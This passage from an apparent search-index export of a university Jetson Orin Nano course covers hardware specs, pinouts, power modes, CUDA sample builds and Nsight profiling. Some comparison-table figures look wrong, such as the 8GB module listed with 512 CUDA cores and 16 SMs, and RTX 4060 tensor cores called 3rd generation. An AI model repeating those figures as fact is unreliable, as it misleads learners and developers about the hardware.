functionality, running containerized applications, or developing their own AI/robotics projects\u2014without needing to configure the system themselves or worry about low-level device setup. This streamlined environment is ideal for focusing on learning and experimentation rather than system administration.</p> <p>\u2705 No sudo access required. \u2705 Pre-installed JetPack, Docker, and AI libraries. \u2705 Access Jetson remotely via <code>.local</code> hostname or static IP. \u2705 Custom designed <code>sjsujetsontool</code> to update, launch shell/JupyterLab, run Python scripts, llm models, and monitor system.</p>"},{"location":"curriculum/01a_nvidia_jetson/#jetson-orin-nano-hardware-deep-dive","title":"\ud83d\udd0c Jetson Orin Nano Hardware Deep Dive","text":""},{"location":"curriculum/01a_nvidia_jetson/#system-on-module-som-architecture","title":"\ud83c\udfd7\ufe0f System-on-Module (SOM) Architecture","text":"<p>The Jetson Orin Nano consists of two main components: 1. Jetson Orin Nano Module - The compute module containing CPU, GPU, memory 2. Developer Kit Carrier Board - Provides I/O, power, and expansion interfaces</p>"},{"location":"curriculum/01a_nvidia_jetson/#module-specifications_1","title":"Module Specifications:","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                 Jetson Orin Nano Module                \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\n\u2502  \u2502   6-core    \u2502  \u2502   512-core   \u2502  \u2502    8GB LPDDR5   \u2502 \u2502\n\u2502  \u2502 Cortex-A78AE\u2502  \u2502 Ampere GPU   \u2502  \u2502   102 GB/s BW   \u2502 \u2502\n\u2502  \u2502  @ 1.7GHz   \u2502  \u2502 16 Tensor    \u2502  \u2502                 \u2502 \u2502\n\u2502  \u2502             \u2502  \u2502    Cores     \u2502  \u2502                 \u2502 \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n\u2502                                                         \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\n\u2502  \u2502              Tegra Orin SoC                         \u2502 \u2502\n\u2502  \u2502  \u2022 Video Encoders: 2x 4K30 H.264/H.265             \u2502 \u2502\n\u2502  \u2502  \u2022 Video Decoders: 2x 4K60 H.264/H.265             \u2502 \u2502\n\u2502  \u2502  \u2022 ISP: 2x 12MP cameras                             \u2502 \u2502\n\u2502  \u2502  \u2022 PCIe: 3.0 x8 + 3.0 x4                           \u2502 \u2502\n\u2502  \u2502  \u2022 USB: 4x USB 3.2 Gen2                             \u2502 \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"curriculum/01a_nvidia_jetson/#comprehensive-connector-analysis","title":"\ud83d\udd0c Comprehensive Connector Analysis","text":""},{"location":"curriculum/01a_nvidia_jetson/#power-system","title":"Power System","text":"<ul> <li>DC Jack (19V): Primary power input, 5.5mm x 2.5mm barrel connector</li> <li>Power Modes: </li> <li>5W Mode: CPU @ 1.2GHz, GPU @ 510MHz (fanless operation)</li> <li>15W Mode: CPU @ 1.7GHz, GPU @ 918MHz (active cooling)</li> <li>25W Mode: Maximum performance (requires adequate cooling)</li> </ul> <pre><code># Check current power mode\nsudo nvpmodel -q\n\n# Set to maximum performance\nsudo nvpmodel -m 0\n\n# Set to power-efficient mode\nsudo nvpmodel -m 1\n</code></pre>"},{"location":"curriculum/01a_nvidia_jetson/#display-and-video","title":"Display and Video","text":"<ul> <li>DisplayPort 1.2: Supports up to 4K@60Hz with Multi-Stream Transport (MST)</li> <li>Video Encoding: 2x 4K30 H.264/H.265 hardware encoders</li> <li>Video Decoding: 2x 4K60 H.264/H.265 hardware decoders</li> </ul>"},{"location":"curriculum/01a_nvidia_jetson/#camera-interfaces-mipi-csi-2","title":"Camera Interfaces (MIPI CSI-2)","text":"<pre><code>Camera Connector Pinout (22-pin, 0.5mm pitch):\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Pin \u2502 Signal    \u2502 Pin \u2502 Signal          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  1  \u2502 GND       \u2502 12  \u2502 CSI_D1_N        \u2502\n\u2502  2  \u2502 CSI_CLK_P \u2502 13  \u2502 GND             \u2502\n\u2502  3  \u2502 CSI_CLK_N \u2502 14  \u2502 CSI_D0_P        \u2502\n\u2502  4  \u2502 GND       \u2502 15  \u2502 CSI_D0_N        \u2502\n\u2502  5  \u2502 CSI_D3_P  \u2502 16  \u2502 GND             \u2502\n\u2502  6  \u2502 CSI_D3_N  \u2502 17  \u2502 CAM_I2C_SCL     \u2502\n\u2502  7  \u2502 GND       \u2502 18  \u2502 CAM_I2C_SDA     \u2502\n\u2502  8  \u2502 CSI_D2_P  \u2502 19  \u2502 GND             \u2502\n\u2502  9  \u2502 CSI_D2_N  \u2502 20  \u2502 CAM_PWDN        \u2502\n\u2502 10  \u2502 GND       \u2502 21  \u2502 CAM_RST_N       \u2502\n\u2502 11  \u2502 CSI_D1_P  \u2502 22  \u2502 +3.3V           \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Supported Camera Configurations: - CAM0: 1x2 lane or 1x4 lane MIPI CSI-2 - CAM1: 1x2 lane MIPI CSI-2 - Maximum Resolution: 12MP per camera - Compatible Cameras: IMX219, IMX477, OV5693, and many others</p>"},{"location":"curriculum/01a_nvidia_jetson/#storage-expansion-m2-slots","title":"Storage Expansion (M.2 Slots)","text":"<p>M.2 Key-M Slot (2280 size) - PCIe 3.0 x4: - Use Cases: High-performance NVMe SSDs - Max Speed: ~3.5 GB/s sequential read - Recommended: Samsung 980, WD SN570, Crucial P3</p> <p>M.2 Key-M Slot (2230 size) - PCIe 3.0 x2: - Use Cases: Compact SSDs, additional storage - Max Speed: ~1.7 GB/s sequential read</p> <p>M.2 Key-E Slot (2230 size) - PCIe 3.0 x1 + USB 2.0: - Use Cases: WiFi/Bluetooth modules, cellular modems - Pre-populated: Intel AX201 WiFi 6 + Bluetooth 5.2 - Alternatives: Quectel EM05-G (4G LTE), Sierra Wireless modules</p>"},{"location":"curriculum/01a_nvidia_jetson/#40-pin-gpio-expansion-header","title":"\ud83d\udd27 40-Pin GPIO Expansion Header","text":"<p>The 40-pin header provides extensive I/O capabilities compatible with Raspberry Pi HATs:</p> <pre><code>     3.3V  (1) (2)  5V\n GPIO2/SDA  (3) (4)  5V\n GPIO3/SCL  (5) (6)  GND\n    GPIO4  (7) (8)  GPIO14/TXD\n      GND  (9) (10) GPIO15/RXD\n   GPIO17 (11) (12) GPIO18/PWM\n   GPIO27 (13) (14) GND\n   GPIO22 (15) (16) GPIO23\n     3.3V (17) (18) GPIO24\n GPIO10/MOSI(19) (20) GND\n GPIO9/MISO (21) (22) GPIO25\n GPIO11/SCLK(23) (24) GPIO8/CE0\n      GND (25) (26) GPIO7/CE1\n   ID_SD  (27) (28) ID_SC\n    GPIO5 (29) (30) GND\n    GPIO6 (31) (32) GPIO12/PWM\n   GPIO13 (33) (34) GND\n   GPIO19 (35) (36) GPIO16\n   GPIO26 (37) (38) GPIO20\n      GND (39) (40) GPIO21\n</code></pre>"},{"location":"curriculum/01a_nvidia_jetson/#available-interfaces","title":"Available Interfaces:","text":"<ul> <li>I2C: 2 channels (I2C-1: pins 3,5; I2C-0: pins 27,28)</li> <li>SPI: 2 channels (SPI0: pins 19,21,23,24,26; SPI1: pins 12,35,38,40)</li> <li>UART: 1 channel (pins 8,10)</li> <li>PWM: 4 channels (pins 12,32,33,35)</li> <li>GPIO: 26 digital I/O pins</li> <li>Power: 3.3V, 5V, and multiple GND pins</li> </ul>"},{"location":"curriculum/01a_nvidia_jetson/#resources","title":"\ud83d\udd17 Resources","text":"<ul> <li>NVIDIA Jetson Developer Site</li> <li>JetPack SDK</li> <li>Jetson Orin Nano Datasheet</li> <li>CUDA Toolkit</li> <li>TensorRT Documentation</li> <li>Jetson GPIO Library</li> <li>NVIDIA Nsight Systems</li> <li>Jetson Community Projects</li> <li>JetPack SDK Components</li> <li>Jetson Hardware Design Guidelines</li> </ul>"},{"location":"curriculum/01b_jetson_cuda/","title":"\ud83e\udde0 CUDA Programming Fundamentals and Jetson CUDA examples","text":"<p>Author: Dr. Kaikai Liu, Ph.D. Position: Associate Professor, Computer Engineering Institution: San Jose State University Contact: kaikai.liu@sjsu.edu</p>"},{"location":"curriculum/01b_jetson_cuda/#what-is-cuda","title":"\ud83d\udd39 What is CUDA?","text":"<p>CUDA (Compute Unified Device Architecture) is NVIDIA's parallel computing platform and programming model that enables developers to harness GPU power for general-purpose computing. Unlike traditional CPU programming, CUDA allows you to write programs that execute thousands of threads simultaneously on the GPU.</p>"},{"location":"curriculum/01b_jetson_cuda/#key-cuda-concepts","title":"Key CUDA Concepts:","text":"Concept Description Example Kernel Function that runs on GPU <code>__global__ void add_vectors(float* a, float* b, float* c)</code> Thread Basic execution unit Each thread processes one array element Block Group of threads (up to 1024) 256 threads per block Grid Collection of blocks 1000 blocks in a grid Warp 32 threads executed together Hardware scheduling unit"},{"location":"curriculum/01b_jetson_cuda/#cuda-memory-hierarchy","title":"CUDA Memory Hierarchy:","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Global Memory              \u2502  \u2190 Largest, slowest (LPDDR5)\n\u2502                (8GB)                    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502            L2 Cache (2MB)               \u2502  \u2190 Shared across SMs\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  SM 0    \u2502  SM 1    \u2502  ...  \u2502  SM 15   \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2510  \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2510  \u2502       \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n\u2502 \u2502L1/  \u2502  \u2502 \u2502L1/  \u2502  \u2502       \u2502 \u2502L1/  \u2502  \u2502  \u2190 Fast, per-SM\n\u2502 \u2502Shr  \u2502  \u2502 \u2502Shr  \u2502  \u2502       \u2502 \u2502Shr  \u2502  \u2502\n\u2502 \u250264KB \u2502  \u2502 \u250264KB \u2502  \u2502       \u2502 \u250264KB \u2502  \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2518  \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2518  \u2502       \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n\u2502 Regs     \u2502 Regs     \u2502       \u2502 Regs     \u2502  \u2190 Fastest, per-thread\n\u2502 64K      \u2502 64K      \u2502       \u2502 64K      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#jetson-orin-nano-cuda-specifications","title":"\ud83c\udfaf Jetson Orin Nano CUDA Specifications","text":"Feature Jetson Orin Nano Desktop RTX 4060 Data Center A100 CUDA Cores 512 3072 6912 Tensor Cores 16 (3rd Gen) 128 (3rd Gen) 432 (3rd Gen) SMs 16 24 108 Memory 8GB LPDDR5 8GB GDDR6 40/80GB HBM2e Memory Bandwidth 102 GB/s 272 GB/s 1555 GB/s Power 7-25W 115W 400W CUDA Compute 8.7 8.9 8.0 <p>Key Insight: Jetson Orin Nano provides excellent CUDA capability per watt, making it ideal for edge AI applications where power efficiency is critical.</p>"},{"location":"curriculum/01b_jetson_cuda/#cuda-development-on-jetson","title":"\ud83d\udd27 CUDA Development on Jetson","text":"<p>Jetson supports native CUDA (C/C++) for fine-grained control. Ideal for performance-critical compute kernels.</p> <p>NVIDIA CUDA Compiler (NVCC): NVCC is a compiler driver provided by NVIDIA for compiling CUDA C/C++ programs. It's a toolchain that manages the compilation process, generating binary executables containing both host (CPU) code and device (GPU) code.</p> <p>Install CUDA nvcc: Even though JetPack 6.2 (L4T 36.4.3) includes CUDA 12.6, the nvcc command is not installed by default on Jetson devices starting from JetPack 6.x. CUDA is split into host and device components. On Jetson, only the runtime components of CUDA are installed by default (for deploying and running models). The full CUDA toolkit (including nvcc, compiler, samples, etc.) is now optional. </p> <p>We already installed the full CUDA toolkit in our provided Jetson image. You can check the <code>nvcc</code> command by running: <pre><code>sjsujetson@sjsujetson-01:~$ nvcc --version\nnvcc: NVIDIA (R) Cuda compiler driver\nCopyright (c) 2005-2024 NVIDIA Corporation\nBuilt on Wed_Aug_14_10:14:07_PDT_2024\nCuda compilation tools, release 12.6, V12.6.68\nBuild cuda_12.6.r12.6/compiler.34714021_0\n</code></pre> The following CUDA 12.6 path are already added to the <code>~/.bashrc</code> <pre><code>export PATH=/usr/local/cuda-12.6/bin:$PATH\nexport LD_LIBRARY_PATH=/usr/local/cuda-12.6/lib64:$LD_LIBRARY_PATH\n</code></pre></p>"},{"location":"curriculum/01b_jetson_cuda/#run-cuda-samples","title":"\ud83e\uddea Run CUDA Samples","text":"<p>To build cuda samples, we need to use the new version of cmake (already downloaded in <code>/Developer</code>) <pre><code>sjsujetson@sjsujetson-01:~$ export PATH=/Developer/cmake-3.28.3-linux-aarch64/bin:$PATH\nsjsujetson@sjsujetson-01:~$ cmake --version\ncmake version 3.28.3\n\nCMake suite maintained and supported by Kitware (kitware.com/cmake).\n</code></pre> <code>cuda-samples</code> folder is also available in the <code>/Developer</code> folder, you can run cudda samples inside the build folder: <pre><code>sjsujetson@sjsujetson-01:/Developer/cuda-samples/build$ ./0_Introduction/vectorAdd/vectorAdd\n[Vector addition of 50000 elements]\nCopy input data from the host memory to the CUDA device\nCUDA kernel launch with 196 blocks of 256 threads\nCopy output data from the CUDA device to the host memory\nTest PASSED\nDone\nsjsujetson@sjsujetson-01:/Developer/cuda-samples/build$ ./1_Utilities/deviceQuery/deviceQuery\n...\nResult = PASS\nsjsujetson@sjsujetson-01:/Developer/cuda-samples/build$ ./0_Introduction/matrixMul/matrixMul\nsjsujetson@sjsujetson-01:/Developer/cuda-samples/build$ ./0_Introduction/asyncAPI/asyncAPI #Demonstrates overlapping data transfers and kernel execution using CUDA streams. \nsjsujetson@sjsujetson-01:/Developer/cuda-samples/build$ ./0_Introduction/UnifiedMemoryStreams/UnifiedMemoryStreams #Demonstrates using Unified Memory with async memory prefetching\nsjsujetson@sjsujetson-01:/Developer/cuda-samples/build$ ./2_Concepts_and_Techniques/convolutionTexture/convolutionTexture #Demonstrates using CUDA\u2019s texture memory to do efficient image convolution.\nsjsujetson@sjsujetson-01:/Developer/cuda-samples/build$ ./2_Concepts_and_Techniques/histogram/histogram #Computes histograms with/without shared memory. \n</code></pre></p> <p>If you made changes to the sample code, and want to rebuild it, you can use <pre><code>sjsujetson@sjsujetson-01:/Developer/cuda-samples/build$ cmake ../Samples -DCMAKE_CUDA_ARCHITECTURES=\"72;87\"\n-- Configuring done (14.4s)\n-- Generating done (0.7s)\n-- Build files have been written to: /Developer/cuda-samples/build\nsjsujetson@sjsujetson-01:/Developer/cuda-samples/build$ make -j$(nproc)\n</code></pre> CMAKE_CUDA_ARCHITECTURES 72 and 87 is for Jetson Xavier NX and Orin</p> <p>You can get the cuda architecture from  <pre><code>deviceQuery | grep \"CUDA Capability\"\n  CUDA Capability Major/Minor version number:    8.7\n</code></pre></p>"},{"location":"curriculum/01b_jetson_cuda/#nvidia-cuda-profiling-tools","title":"NVIDIA CUDA Profiling Tools","text":""},{"location":"curriculum/01b_jetson_cuda/#1-nvidia-nsight-systems-installation-in-container","title":"1. NVIDIA Nsight Systems - Installation in Container","text":"<p>NVIDIA Nsight installation: Nsight system is expected to be install manually if required. Please run below within the container: <pre><code>$ sjsujetsontool shell #enter into container\nroot@sjsujetson-01:/Developer/cuda-samples/build# apt update\n\\\n#download the nsight package from https://repo.download.nvidia.com/jetson/#Jetpack%206.1/6.2/6.2.1\nroot@sjsujetson-01:/Developer# wget https://repo.download.nvidia.com/jetson/common/pool/main/n/nsight-systems-2024.5.4/nsight-systems-2024.5.4_2024.5.4.34-245434855735v0_arm64.deb\n#inspect the package\nroot@sjsujetson-01:/Developer# dpkg -c nsight-systems-2024.5.4_2024.5.4.34-245434855735v0_arm64.deb\nroot@sjsujetson-01:/Developer# apt install -y ./nsight-systems-2024.5.4_2024.5.4.34-245434855735v0_arm64.deb\nroot@sjsujetson-01:/Developer# nsys --version\nNVIDIA Nsight Systems version 2024.5.4.34-245434855735v0\nroot@sjsujetson-01:/Developer# which nsys\n/usr/local/bin/nsys\n</code></pre></p> <p>nsight-systems installation</p>"},{"location":"curriculum/01b_jetson_cuda/#2-nvidia-nsight-systems-system-wide-profiling","title":"2. NVIDIA Nsight Systems - System-wide profiling","text":"<p><pre><code># Profile a CUDA application\nroot@sjsujetson-01:/Developer/cuda-samples/build# nsys profile --stats=true ./0_Introduction/vectorAdd/vectorAdd\n....\nGenerated:\n    /Developer/cuda-samples/build/report2.nsys-rep\n    /Developer/cuda-samples/build/report2.sqlite\n</code></pre> <code>report2.nsys-rep</code> is the Main profiling report (for Nsight Systems UI or CLI import/export); <code>report2.sqlite</code> is the Internal database format (used for CLI stats and custom scripts)</p> <p>If you have Nsight Systems GUI installed on your host PC (x86) or remote desktop session, you can Open GUI on Host Machine: <code>nsys-ui /path/to/report2.nsys-rep</code>.</p> <p>You can also get high-level summaries without the GUI: <pre><code>root@sjsujetson-01:/Developer/cuda-samples/build# nsys stats --force-export=true /Developer/cuda-samples/build/report2.nsys-rep\nGenerating SQLite file /Developer/cuda-samples/build/report2.sqlite from /Developer/cuda-samples/build/report2.nsys-rep\nProcessing [/Developer/cuda-samples/build/report2.sqlite] with [/opt/nvidia/nsight-systems/2024.5.4/host-linux-armv8/reports/nvtx_sum.py]... \n ** OS Runtime Summary (osrt_sum):\n ** CUDA API Summary (cuda_api_sum):\n ** CUDA GPU Kernel Summary (cuda_gpu_kern_sum):\n ** CUDA GPU MemOps Summary (by Time) (cuda_gpu_mem_time_sum):\n ** CUDA GPU MemOps Summary (by Size) (cuda_gpu_mem_size_sum):\n</code></pre> Or export to CSV: <pre><code>root@sjsujetson-01:/Developer/cuda-samples/build# nsys stats --format csv --output report2_summary --force-export=true /Developer/cuda-samples/build/report2.nsys-rep\nroot@sjsujetson-01:/Developer/cuda-samples/build# ls *.csv\nreport2_summary_cuda_api_sum.csv\nreport2_summary_cuda_gpu_kern_sum.csv\nreport2_summary_cuda_gpu_mem_size_sum.csv\nreport2_summary_cuda_gpu_mem_time_sum.csv\nreport2_summary_dx11_pix_sum.csv\nreport2_summary_dx12_gpu_marker_sum.csv\nreport2_summary_dx12_pix_sum.csv\nreport2_summary_nvtx_sum.csv\nreport2_summary_openacc_sum.csv\nreport2_summary_opengl_khr_gpu_range_sum.csv\nreport2_summary_opengl_khr_range_sum.csv\nreport2_summary_openmp_sum.csv\nreport2_summary_osrt_sum.csv\nreport2_summary_syscall_sum.csv\nreport2_summary_um_cpu_page_faults_sum.csv\nreport2_summary_um_sum.csv\nreport2_summary_um_total_sum.csv\nreport2_summary_vulkan_gpu_marker_sum.csv\nreport2_summary_vulkan_marker_sum.csv\nreport2_summary_wddm_queue_sum.csv\n</code></pre></p> <p>Generate timeline view <pre><code>root@sjsujetson-01:/Developer/cuda-samples/build# nsys profile -o my_profile ./0_Introduction/vectorAdd/vectorAdd\nCollecting data...\n[Vector addition of 50000 elements]\nCopy input data from the host memory to the CUDA device\nCUDA kernel launch with 196 blocks of 256 threads\nCopy output data from the CUDA device to the host memory\nTest PASSED\nDone\nGenerating '/tmp/nsys-report-d475.qdstrm'\n[1/1] [========================100%] my_profile.nsys-rep\nGenerated:\n    /Developer/cuda-samples/build/my_profile.nsys-rep\n</code></pre> Copy the .nsys-rep file from Jetson to your PC and open with Nsight Systems UI <code>nsys-ui</code></p>"},{"location":"curriculum/01b_jetson_cuda/#3-nvidia-nsight-compute-kernel-level-profiling","title":"3. NVIDIA Nsight Compute - Kernel-level profiling","text":"<p>Install Nvidia Nsight Compute, ncu = Nsight Compute CLI profiler for GPU kernel-level profiling (e.g., occupancy, memory throughput, instruction-level analysis). It\u2019s part of the Nsight Compute package, separate from nsys (Nsight Systems). <pre><code>root@sjsujetson-01:/Developer# wget https://repo.download.nvidia.com/jetson/dgpu-rm/pool/main/n/nsight-compute/nsight-compute-2024.3.1_2024.3.1.2-1_arm64.deb\nroot@sjsujetson-01:/Developer# apt install ./nsight-compute-2024.3.1_2024.3.1.2-1_arm64.deb\nroot@sjsujetson-01:/Developer# ls /opt/nvidia/nsight-compute/2024.3.1/\ndocs  extras  host  ncu  ncu-ui  sections  target\nroot@sjsujetson-01:/Developer# export PATH=/opt/nvidia/nsight-compute/2024.3.1:$PATH\nroot@sjsujetson-01:/Developer# ncu --version\nNVIDIA (R) Nsight Compute Command Line Profiler\nCopyright (c) 2018-2024 NVIDIA Corporation\nVersion 2024.3.1.0 (build 34702747) (public-release)\n</code></pre> Rebuild CUDA sample with debug=1 (<code>make SMS=\"all\" debug=1</code>), then run the following <pre><code># Detailed kernel analysis\nroot@sjsujetson-01:/Developer/cuda-samples/build# ncu --set full ./0_Introduction/vectorAdd/vectorAdd\n# Memory throughput analysis\nncu --metrics dram__throughput.avg.pct_of_peak_sustained_elapsed ./0_Introduction/vectorAdd/vectorAdd\n</code></pre></p>"},{"location":"curriculum/01b_jetson_cuda/#cuda-programming-model-on-jetson-orin-nano","title":"\ud83d\ude80 CUDA Programming Model on Jetson Orin Nano","text":""},{"location":"curriculum/01b_jetson_cuda/#complete-cuda-programming-examples","title":"\ud83d\ude80 Complete CUDA Programming Examples","text":""},{"location":"curriculum/01b_jetson_cuda/#1-vector-addition-example","title":"1. Vector Addition Example","text":"<pre><code>#create vector_add.cu - Complete CUDA Vector Addition Example\nroot@sjsujetson-01:/Developer/mycuda_samples# nano vector_add.cu\nroot@sjsujetson-01:/Developer/mycuda_samples# nvcc -o vector_add vector_add.cu -arch=sm_87\nroot@sjsujetson-01:/Developer/mycuda_samples# ls\nvector_add  vector_add.cu  vector_multiply.cu\nroot@sjsujetson-01:/Developer/mycuda_samples# ./vector_add \nVector addition completed in 72848 microseconds\nResult: PASSED\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#2-vector-multiplication-example","title":"2. Vector Multiplication Example","text":"<pre><code># add vector_multiply.cu - Element-wise Vector Multiplication\nroot@sjsujetson-01:/Developer/mycuda_samples# nvcc -o vector_multiply vector_multiply.cu -arch=sm_87\nroot@sjsujetson-01:/Developer/mycuda_samples# ./vector_multiply \nResult: PASSED\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#3-matrix-multiplication-example","title":"3. Matrix Multiplication Example","text":"<pre><code>#create matrix_multiply.cu - CUDA Matrix Multiplication\nroot@sjsujetson-01:/Developer/mycuda_samples# nano matrix_multiply.cu\nroot@sjsujetson-01:/Developer/mycuda_samples# nvcc -O2 -lineinfo -arch=sm_87 -o matrix_multiply matrix_multiply.cu\n./matrix_multiply\nResult: PASSED\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#4-advanced-memory-management-example","title":"4. Advanced Memory Management Example","text":"<pre><code># create memory_management.cu - Advanced CUDA Memory Management\nroot@sjsujetson-01:/Developer/mycuda_samples# nvcc -O2 -lineinfo -arch=sm_87 -o memory_management memory_management.cu\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#build-instructions","title":"\ud83d\udee0\ufe0f Build Instructions","text":""},{"location":"curriculum/01b_jetson_cuda/#1-create-makefile","title":"1. Create Makefile","text":"<pre><code># Makefile for CUDA examples\nNVCC = nvcc\nCUDA_FLAGS = -std=c++11 -O3 -arch=sm_87  # sm_87 for Jetson Orin, adjust for your device\nCXX_FLAGS = -std=c++11 -O3\n\n# Targets\nall: vector_add vector_multiply matrix_multiply memory_demo\n\nvector_add: vector_add.cu\n    $(NVCC) $(CUDA_FLAGS) -o vector_add vector_add.cu\n\nvector_multiply: vector_multiply.cu\n    $(NVCC) $(CUDA_FLAGS) -o vector_multiply vector_multiply.cu\n\nmatrix_multiply: matrix_multiply.cu\n    $(NVCC) $(CUDA_FLAGS) -o matrix_multiply matrix_multiply.cu\n\nmemory_demo: memory_management.cu\n    $(NVCC) $(CUDA_FLAGS) -o memory_demo memory_management.cu\n\nclean:\n    rm -f vector_add vector_multiply matrix_multiply memory_demo\n\n# Debug builds with device debugging enabled\ndebug: CUDA_FLAGS += -g -G\ndebug: all\n\n# Profile builds optimized for profiling\nprofile: CUDA_FLAGS += -lineinfo\nprofile: all\n\n.PHONY: all clean debug profile\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#2-build-commands","title":"2. Build Commands","text":"<pre><code>root@sjsujetson-01:/Developer/mycuda_samples# make\nnvcc -std=c++11 -O3 -arch=sm_87   -o vector_add vector_add.cu\nnvcc -std=c++11 -O3 -arch=sm_87   -o vector_multiply vector_multiply.cu\nnvcc -std=c++11 -O3 -arch=sm_87   -o matrix_multiply matrix_multiply.cu\nnvcc -std=c++11 -O3 -arch=sm_87   -o memory_demo memory_management.cu\n\n# Build all examples\nmake all\n\n# Build individual examples\nmake vector_add\nmake matrix_multiply\n\n# Build with debug information for profiling\nmake profile\n\n# Clean build artifacts\nmake clean\n</code></pre>"},{"location":"curriculum/01b_jetson_cuda/#3-alternative-cmake-build","title":"3. Alternative CMake Build","text":"<pre><code># CMakeLists.txt\ncmake_minimum_required(VERSION 3.18)\nproject(CudaExamples LANGUAGES CXX CUDA)\n\nset(CMAKE_CXX_STANDARD 11)\nset(CMAKE_CUDA_STANDARD 11)\n\n# Find CUDA\nfind_package(CUDA REQUIRED)\n\n# Set CUDA architecture (adjust for your 